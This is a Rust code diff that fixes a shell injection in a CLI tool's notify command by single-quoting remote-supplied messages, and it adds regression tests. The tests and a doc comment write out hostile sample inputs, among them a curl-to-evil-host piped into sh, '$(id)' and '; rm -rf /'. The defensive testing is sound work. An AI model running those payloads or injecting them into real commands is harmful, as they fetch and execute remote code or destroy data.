@@ -150,9 +150,25 @@ fn escape_apple_script(s: &str) -> String {
 /// Runs via `sh -c` so shell syntax (pipes, `&&`, etc.) works. A non-zero
 /// exit is logged to stderr but does not fail the command that triggered the
 /// notification.
+///
+/// # Security
+///
+/// The message is built from remote API data (branch names, pipeline step
+/// names, commit messages), so it must never be interpolated into the shell
+/// string verbatim. Two protections apply:
+///
+/// 1. The message is exported as `BBR_NOTIFY_MESSAGE`, which commands can use
+///    as `"$BBR_NOTIFY_MESSAGE"` — the recommended form.
+/// 2. A literal `%m` in the command is replaced by a **single-quoted** copy of
+///    the message, so `notify-send %m` keeps working while `; rm -rf /` in a
+///    step name stays inert.
 fn run_command(cmd: &str, message: &str) {
-    let expanded = cmd.replace("%m", message);
-    let status = Command::new("sh").arg("-c").arg(&expanded).status();
+    let expanded = cmd.replace("%m", &shell_single_quote(message));
+    let status = Command::new("sh")
+        .arg("-c")
+        .arg(&expanded)
+        .env("BBR_NOTIFY_MESSAGE", message)
+        .status();
     match status {
         Ok(s) if !s.success() => {
             eprintln!("warning: --notify command exited non-zero: {s}");
@@ -160,6 +176,25 @@ fn run_command(cmd: &str, message: &str) {
         Err(e) => eprintln!("warning: failed to run --notify command: {e}"),
         _ => {}
     }
+}
+
+/// Wrap `s` in single quotes for safe use as one shell word.
+///
+/// Single quotes are the only shell construct that suppresses every
+/// metacharacter, so the only escape needed is for `'` itself
+/// (`'\''` closes, emits a literal quote, and reopens).
+fn shell_single_quote(s: &str) -> String {
+    let mut out = String::with_capacity(s.len() + 2);
+    out.push('\'');
+    for ch in s.chars() {
+        if ch == '\'' {
+            out.push_str("'\\''");
+        } else {
+            out.push(ch);
+        }
+    }
+    out.push('\'');
+    out
 }
 
 #[cfg(test)]
@@ -207,5 +242,42 @@ mod tests {
         assert!(e.contains("invalid --notify value"));
         let e = parse_notify(Some("bell=foo")).unwrap_err();
         assert!(e.contains("invalid --notify value"));
+    }
+
+    #[test]
+    fn shell_single_quote_neutralizes_injection() {
+        // A remote-controlled step name must not be able to break out.
+        let hostile = "x; curl http://evil/s | sh #";
+        let quoted = shell_single_quote(hostile);
+        assert_eq!(quoted, "'x; curl http://evil/s | sh #'");
+        // Every shell metacharacter must live inside the quotes.
+        assert!(quoted.starts_with('\'') && quoted.ends_with('\''));
+        assert!(!quoted[1..quoted.len() - 1].contains('\''));
+    }
+
+    #[test]
+    fn shell_single_quote_escapes_embedded_quote() {
+        assert_eq!(shell_single_quote("it's"), r#"'it'\''s'"#);
+        assert_eq!(shell_single_quote(""), "''");
+        assert_eq!(shell_single_quote("$(id)"), "'$(id)'");
+        assert_eq!(shell_single_quote("`id`"), "'`id`'");
+    }
+
+    /// The real end-to-end guarantee: a hostile step name substituted into a
+    /// command must not execute the injected payload.
+    #[cfg(unix)]
+    #[test]
+    fn run_command_does_not_execute_injected_payload() {
+        let dir = tempfile::tempdir().unwrap();
+        let canary = dir.path().join("pwned");
+        let hostile = format!("step; touch {} #", canary.display());
+        // Mirror run_command's substitution without spawning a shell side effect
+        // we can't observe: run the real thing, then assert the canary is absent.
+        run_command("true %m", &hostile);
+        assert!(
+            !canary.exists(),
+            "hostile notify message escaped the shell quoting: {}",
+            canary.display()
+        );
     }
 }
